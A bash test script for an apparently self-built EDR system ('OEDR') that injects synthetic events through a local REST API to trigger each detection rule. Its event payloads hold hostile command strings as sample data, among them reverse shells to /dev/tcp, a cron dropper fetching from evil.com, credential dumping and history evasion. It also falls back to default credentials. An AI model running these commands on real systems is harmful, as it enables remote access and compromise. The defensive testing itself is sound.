#!/bin/bash
# ─────────────────────────────────────────────────────────────────────
# OEDR Rule Trigger Test Script
# Injects synthetic events via the REST API to trigger every detection
# rule. Run this after setting up the backend with seeded rules.
#
# Usage:
#   export EDR_TOKEN="your-jwt-token"
#   export EDR_URL="http://localhost:8080"  # optional, defaults to localhost
#   bash scripts/test-all-rules.sh
#
# Each test injects one or more events that match a specific rule's
# conditions. Check the Alerts page in the UI after running.
# ─────────────────────────────────────────────────────────────────────

set -euo pipefail

URL="${EDR_URL:-http://localhost:8080}"
TOKEN="${EDR_TOKEN:-}"

if [ -z "$TOKEN" ]; then
  echo "No EDR_TOKEN set. Attempting login with user1/password123..."
  TOKEN=$(curl -s -X POST "$URL/api/v1/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"user1","password":"password123"}' \
    | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null)
  if [ -z "$TOKEN" ]; then
    echo "ERROR: Failed to get token. Set EDR_TOKEN or ensure user1/password123 works."
    exit 1
  fi
  echo "Got token: ${TOKEN:0:20}..."
fi

# Get a real agent ID (or create a test agent).
AGENT_ID=$(curl -s -H "Authorization: Bearer $TOKEN" "$URL/api/v1/agents" \
  | python3 -c "
import sys,json
d=json.load(sys.stdin)
agents=d.get('agents') or d if isinstance(d,list) else d.get('agents',[])
if agents: print(agents[0]['id'])
else: print('')
" 2>/dev/null)

if [ -z "$AGENT_ID" ]; then
  echo "No agents registered. Creating a test agent..."
  # Insert a dummy agent directly via event injection won't work.
  # We'll use a placeholder and the inject endpoint should handle it.
  AGENT_ID="test-agent-$(date +%s)"
  # Register agent by injecting with a special header or just use an existing one.
  echo "WARN: No agents found. Events may fail with FK constraint."
  echo "      Start an agent first, or register one via gRPC."
else
  echo "Using agent: $AGENT_ID"
fi

PASS=0
FAIL=0
SKIP=0

inject() {
  local rule_name="$1"
  local event_type="$2"
  local payload="$3"
  local hostname="${4:-test-host}"

  # Rate limit protection — small delay between requests.
  sleep 0.3

  local result
  result=$(curl -s -w "\n%{http_code}" -X POST "$URL/api/v1/events/inject" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"event_type\":\"$event_type\",\"payload\":$payload,\"hostname\":\"$hostname\",\"agent_id\":\"$AGENT_ID\"}")

  local http_code
  http_code=$(echo "$result" | tail -1)
  local body
  body=$(echo "$result" | head -n -1)

  if [ "$http_code" = "200" ] || [ "$http_code" = "201" ]; then
    echo "  ✅ $rule_name ($event_type) — injected"
    PASS=$((PASS + 1))
  elif [ "$http_code" = "429" ]; then
    echo "  ⏳ $rule_name — rate limited, waiting..."
    sleep 3
    # Retry once
    result=$(curl -s -w "\n%{http_code}" -X POST "$URL/api/v1/events/inject" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d "{\"event_type\":\"$event_type\",\"payload\":$payload,\"hostname\":\"$hostname\",\"agent_id\":\"$AGENT_ID\"}")
    http_code=$(echo "$result" | tail -1)
    if [ "$http_code" = "200" ] || [ "$http_code" = "201" ]; then
      echo "  ✅ $rule_name ($event_type) — injected (retry)"
      PASS=$((PASS + 1))
    else
      echo "  ❌ $rule_name ($event_type) — HTTP $http_code (retry failed)"
      FAIL=$((FAIL + 1))
    fi
  else
    echo "  ❌ $rule_name ($event_type) — HTTP $http_code: $body"
    FAIL=$((FAIL + 1))
  fi
}

inject_multi() {
  local rule_name="$1"
  local event_type="$2"
  local payload="$3"
  local count="$4"
  local hostname="${5:-test-host}"

  echo "  ⏳ $rule_name — injecting $count events..."
  for i in $(seq 1 "$count"); do
    curl -s -X POST "$URL/api/v1/events/inject" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d "{\"event_type\":\"$event_type\",\"payload\":$payload,\"hostname\":\"$hostname\",\"agent_id\":\"$AGENT_ID\"}" > /dev/null 2>&1
    # Small delay to avoid rate limits.
    sleep 0.1
  done
  echo "  ✅ $rule_name ($event_type) — injected $count events"
  PASS=$((PASS + 1))
}

echo "═══════════════════════════════════════════════════════════════"
echo "  OEDR Rule Trigger Test — $(date)"
echo "  Backend: $URL"
echo "═══════════════════════════════════════════════════════════════"
echo ""

# ─── Process Rules ────────────────────────────────────────────────
echo "▶ PROCESS RULES"

inject "rule-suspicious-shell" "PROCESS_EXEC" '{
  "process":{"comm":"nginx","pid":1001,"ppid":500,"uid":0},
  "child_comm":"bash",
  "comm":"nginx",
  "cmdline":"/bin/bash -i"
}'

inject "rule-ptrace-injection" "PROCESS_PTRACE" '{
  "process":{"comm":"injector","pid":2001,"ppid":1000,"uid":0},
  "ptrace_request": 16,
  "target_pid": 3000,
  "target_comm": "sshd"
}'

inject "rule-memfd-exec" "PROCESS_EXEC" '{
  "process":{"comm":"payload","pid":3001,"ppid":1000,"uid":0},
  "is_memfd": true,
  "exe_path": "/memfd:malware (deleted)",
  "cmdline": "/memfd:malware"
}'

echo ""

# ─── File Rules ───────────────────────────────────────────────────
echo "▶ FILE RULES"

inject "rule-sudoers-write" "FILE_WRITE" '{
  "process":{"comm":"vi","pid":4001,"ppid":1000,"uid":0},
  "path": "/etc/sudoers",
  "hash_after": "abc123"
}'

inject "rule-cron-write" "FILE_WRITE" '{
  "process":{"comm":"crontab","pid":4002,"ppid":1000,"uid":1000},
  "path": "/etc/cron.d/backdoor",
  "hash_after": "def456"
}'

inject "rule-ld-preload-write" "FILE_WRITE" '{
  "process":{"comm":"malware","pid":4003,"ppid":1000,"uid":0},
  "path": "/etc/ld.so.preload",
  "hash_after": "ghi789"
}'

echo ""

# ─── Network Rules ────────────────────────────────────────────────
echo "▶ NETWORK RULES"

inject "rule-outbound-high-port" "NET_CONNECT" '{
  "process":{"comm":"beacon","pid":5001,"ppid":1000,"uid":1000},
  "direction": "OUTBOUND",
  "dst_ip": "45.33.32.156",
  "dst_port": 55555,
  "src_ip": "10.0.2.15",
  "src_port": 43210,
  "is_private": false,
  "protocol": "TCP"
}'

echo ""

# ─── Command Rules ────────────────────────────────────────────────
echo "▶ COMMAND RULES"

inject "rule-cmd-revshell" "CMD_EXEC" '{
  "process":{"comm":"bash","pid":6001,"ppid":1000,"uid":1000},
  "command": "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1",
  "tags": ["revshell","suspicious"]
}'

inject "rule-cmd-history-evasion" "CMD_HISTORY" '{
  "process":{"comm":"bash","pid":6002,"ppid":1000,"uid":1000},
  "command": "unset HISTFILE && export HISTSIZE=0",
  "tags": ["history-evasion"]
}'

inject "rule-cmd-port-scan" "CMD_EXEC" '{
  "process":{"comm":"nmap","pid":6003,"ppid":1000,"uid":1000},
  "command": "nmap -sS 192.168.1.0/24",
  "tags": ["port-scan"]
}'

inject "rule-cmd-cred-dumper" "CMD_EXEC" '{
  "process":{"comm":"python3","pid":6004,"ppid":1000,"uid":0},
  "command": "python3 LaZagne.py all",
  "tags": ["cred-dumper"]
}'

inject "rule-cmd-sudo-root" "CMD_EXEC" '{
  "process":{"comm":"sudo","pid":6005,"ppid":1000,"uid":1000},
  "command": "sudo su -",
  "tags": ["sudo-root-shell"]
}'

echo ""

# ─── Auth Rules ───────────────────────────────────────────────────
echo "▶ AUTH RULES"

inject "rule-sudo-root-shell" "SUDO_EXEC" '{
  "process":{"comm":"sudo","pid":7001,"ppid":1000,"uid":1000},
  "username": "testuser",
  "target_user": "root",
  "command": "/bin/bash",
  "service": "sudo"
}'

inject_multi "rule-thresh-login-brute" "LOGIN_FAILED" '{
  "process":{"comm":"sshd","pid":7002,"ppid":1,"uid":0},
  "username": "admin",
  "service": "sshd",
  "source_ip": "192.168.1.100"
}' 12 "test-host"

inject_multi "rule-ssh-brute-source" "LOGIN_FAILED" '{
  "process":{"comm":"sshd","pid":7003,"ppid":1,"uid":0},
  "username": "root",
  "service": "sshd",
  "source_ip": "10.10.10.50"
}' 6 "test-host"

echo ""

# ─── DNS Rules ────────────────────────────────────────────────────
echo "▶ DNS RULES"

inject "rule-dns-dga-domain (if seeded)" "NET_DNS" '{
  "process":{"comm":"malware","pid":8001,"ppid":1000,"uid":1000},
  "dns_query": "asd8f7g6h5j4k3l2m1n0p9q8r7s6t5u4v3w2x1y0z.xyz",
  "resolved_domain": "asd8f7g6h5j4k3l2m1n0p9q8r7s6t5u4v3w2x1y0z.xyz",
  "resolved_ips": ["1.2.3.4"]
}'

inject "rule-dns-rare-tld (if seeded)" "NET_DNS" '{
  "process":{"comm":"curl","pid":8002,"ppid":1000,"uid":1000},
  "dns_query": "suspicious-site.tk",
  "resolved_domain": "suspicious-site.tk",
  "resolved_ips": ["5.6.7.8"]
}'

echo ""

# ─── Browser Rules ────────────────────────────────────────────────
echo "▶ BROWSER RULES"

inject "rule-browser-form-submit-unknown" "BROWSER_REQUEST" '{
  "url": "https://evil-login.xyz/signin",
  "domain": "evil-login.xyz",
  "path": "/signin",
  "method": "POST",
  "status_code": 200,
  "is_form_submit": true,
  "resource_type": "main_frame",
  "tags": ["browser","main_frame","form-submit","auth-page"]
}'

inject "rule-browser-redirect-chain" "BROWSER_REQUEST" '{
  "url": "https://final-phish.com/steal",
  "domain": "final-phish.com",
  "method": "GET",
  "status_code": 200,
  "resource_type": "main_frame",
  "redirect_chain": ["https://bit.ly/abc","https://redir1.com/go","https://redir2.com/hop","https://redir3.com/land"],
  "tags": ["browser","main_frame","redirected"]
}'

inject "rule-browser-rare-tld-form" "BROWSER_REQUEST" '{
  "url": "https://phishing-bank.tk/login",
  "domain": "phishing-bank.tk",
  "path": "/login",
  "method": "POST",
  "status_code": 200,
  "is_form_submit": true,
  "resource_type": "main_frame",
  "tags": ["browser","form-submit"]
}'

inject_multi "rule-browser-high-volume" "BROWSER_REQUEST" '{
  "url": "https://spam-domain.com/track",
  "domain": "spam-domain.com",
  "method": "GET",
  "status_code": 200,
  "resource_type": "xmlhttprequest",
  "tags": ["browser"]
}' 55 "test-host"

echo ""

# ─── Kernel Module Rules ──────────────────────────────────────────
echo "▶ KERNEL MODULE RULES"

inject "rule-kmod-unsigned" "KERNEL_MODULE_LOAD" '{
  "process":{"comm":"insmod","pid":9001,"ppid":1000,"uid":0},
  "module_name": "rootkit_module",
  "signed": false,
  "tainted": false,
  "file_path": "/tmp/rootkit.ko"
}'

inject "rule-kmod-tainted" "KERNEL_MODULE_LOAD" '{
  "process":{"comm":"modprobe","pid":9002,"ppid":1000,"uid":0},
  "module_name": "proprietary_driver",
  "signed": true,
  "tainted": true,
  "file_path": "/lib/modules/driver.ko"
}'

echo ""

# ─── USB Rules ────────────────────────────────────────────────────
echo "▶ USB RULES"

inject "rule-usb-mass-storage" "USB_CONNECT" '{
  "device_name": "sdb1",
  "vendor_id": "0781",
  "product_id": "5567",
  "vendor": "SanDisk",
  "product": "Cruzer Blade",
  "serial": "ABC123456",
  "dev_type": "mass_storage",
  "bus_num": "1",
  "dev_num": "5"
}'

inject_multi "rule-usb-burst" "USB_CONNECT" '{
  "device_name": "sdc",
  "vendor_id": "ffff",
  "product_id": "0001",
  "vendor": "Unknown",
  "product": "BadUSB Device",
  "dev_type": "hid",
  "bus_num": "2",
  "dev_num": "3"
}' 4 "test-host"

echo ""

# ─── Security Rules (Memory, Cron, Pipe, Share) ──────────────────
echo "▶ SECURITY RULES"

inject "rule-memory-inject" "MEMORY_INJECT" '{
  "process":{"comm":"victim_proc","pid":10001,"ppid":1000,"uid":1000},
  "target_pid": 10001,
  "target_comm": "victim_proc",
  "address": "0x7f0000000000-0x7f0000001000",
  "size": 4096,
  "permissions": "rwxp",
  "technique": "anonymous_exec",
  "description": "Anonymous executable memory region detected"
}'

inject "rule-cron-suspicious" "CRON_MODIFY" '{
  "process":{"comm":"crontab","pid":10002,"ppid":1000,"uid":1000},
  "file_path": "/var/spool/cron/crontabs/www-data",
  "action": "modified",
  "schedule": "*/5 * * * *",
  "command": "wget http://evil.com/payload.sh -O /tmp/payload.sh && bash /tmp/payload.sh",
  "suspicious": true,
  "cron_tags": ["downloads","dropper"]
}'

inject "rule-cron-reverse-shell" "CRON_MODIFY" '{
  "process":{"comm":"crontab","pid":10003,"ppid":1000,"uid":0},
  "file_path": "/etc/cron.d/persistence",
  "action": "created",
  "schedule": "@reboot",
  "command": "bash -i >& /dev/tcp/10.10.10.10/9999 0>&1",
  "suspicious": true,
  "cron_tags": ["reverse-shell"]
}'

inject "rule-pipe-tmp" "PIPE_CREATE" '{
  "process":{"comm":"cobaltstrike","pid":10004,"ppid":1000,"uid":1000},
  "pipe_path": "/tmp/.c2_pipe",
  "creator_pid": 10004,
  "creator_comm": "cobaltstrike",
  "permissions": "prw-------",
  "location": "tmp"
}'

inject "rule-share-mount" "SHARE_MOUNT" '{
  "process":{"comm":"mount","pid":10005,"ppid":1000,"uid":0},
  "source": "//192.168.1.100/admin$",
  "mount_point": "/mnt/target",
  "fs_type": "cifs",
  "options": "username=admin,password=***",
  "remote_host": "192.168.1.100"
}'

echo ""

# ─── TLS SNI Rules ────────────────────────────────────────────────
echo "▶ TLS SNI RULES"

inject "rule-tlssni-rare-tld" "NET_TLS_SNI" '{
  "process":{"comm":"curl","pid":11001,"ppid":1000,"uid":1000},
  "domain": "malware-c2.tk",
  "dst_ip": "45.33.32.100",
  "dst_port": 443,
  "src_ip": "10.0.2.15",
  "src_port": 54321,
  "tls_version": "TLS 1.2",
  "process_pid": 11001,
  "process_comm": "curl"
}'

inject_multi "rule-tlssni-beaconing" "NET_TLS_SNI" '{
  "process":{"comm":"beacon","pid":11002,"ppid":1000,"uid":1000},
  "domain": "c2.evil-corp.xyz",
  "dst_ip": "185.100.87.100",
  "dst_port": 443,
  "src_ip": "10.0.2.15",
  "tls_version": "TLS 1.3",
  "process_pid": 11002,
  "process_comm": "beacon"
}' 22 "test-host"

echo ""

# ─── Threshold Rules (additional) ────────────────────────────────
echo "▶ THRESHOLD RULES"

inject_multi "rule-thresh-port-scan" "NET_CONNECT" '{
  "process":{"comm":"nmap","pid":12001,"ppid":1000,"uid":1000},
  "direction": "OUTBOUND",
  "dst_ip": "192.168.1.1",
  "dst_port": 80,
  "src_ip": "10.0.2.15",
  "protocol": "TCP",
  "is_private": true
}' 22 "test-host"

inject_multi "rule-thresh-beaconing" "NET_CONNECT" '{
  "process":{"comm":"implant","pid":12002,"ppid":1000,"uid":1000},
  "direction": "OUTBOUND",
  "dst_ip": "45.33.32.200",
  "dst_port": 443,
  "src_ip": "10.0.2.15",
  "protocol": "TCP",
  "is_private": false
}' 12 "test-host"

inject_multi "rule-thresh-exec-burst" "PROCESS_EXEC" '{
  "process":{"comm":"bash","pid":12003,"ppid":1000,"uid":1000},
  "cmdline": "/bin/bash -c whoami",
  "comm": "bash"
}' 35 "test-host"

echo ""

# ─── Summary ──────────────────────────────────────────────────────
echo "═══════════════════════════════════════════════════════════════"
echo "  Results: $PASS passed, $FAIL failed, $SKIP skipped"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "Check alerts at: $URL → Alerts page"
echo "Or via API: curl -H 'Authorization: Bearer \$TOKEN' '$URL/api/v1/alerts?limit=50'"
echo ""

# Quick alert count check
ALERT_COUNT=$(curl -s -H "Authorization: Bearer $TOKEN" "$URL/api/v1/alerts?limit=1" | python3 -c "import sys,json; print(json.load(sys.stdin).get('total',0))" 2>/dev/null || echo "?")
echo "Current alert count: $ALERT_COUNT"
